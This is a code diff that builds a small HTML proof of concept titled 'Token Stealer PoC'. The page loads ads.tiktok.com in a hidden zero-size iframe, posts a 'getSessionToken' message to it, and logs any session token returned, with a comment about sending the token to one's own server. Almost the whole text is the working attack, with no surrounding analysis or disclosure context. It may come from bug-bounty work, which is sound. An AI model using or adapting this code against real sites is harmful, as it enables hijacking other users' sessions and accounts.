@@ -1,14 +1,26 @@
-<script>
-  
-const iframe = document.getElementById('victim');
-iframe.onload = function () {
-    iframe.contentWindow.postMessage({ action: 'getSessionToken' }, 'https://ads.tiktok.com');
-};
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Token Stealer PoC</title>
+</head>
+<body>
+    <iframe id="victim" src="https://ads.tiktok.com/app-center/apps/1234" style="width:0;height:0;border:0;"></iframe>
 
-window.addEventListener('message', (e) => {
-    if (e.origin === 'https://ads.tiktok.com') {
-        console.log('Token received from target:', e.data);
-        
-    }
-});
-  </script>
+    <script>
+        window.addEventListener('DOMContentLoaded', () => {
+            const iframe = document.getElementById('victim');
+            iframe.onload = function () {
+                iframe.contentWindow.postMessage({ action: 'getSessionToken' }, 'https://ads.tiktok.com');
+            };
+
+            window.addEventListener('message', (e) => {
+                if (e.origin === 'https://ads.tiktok.com') {
+                    console.log('Token received from target:', e.data);
+                    // Send it to your server or display it
+                }
+            });
+        });
+    </script>
+</body>
+</html>
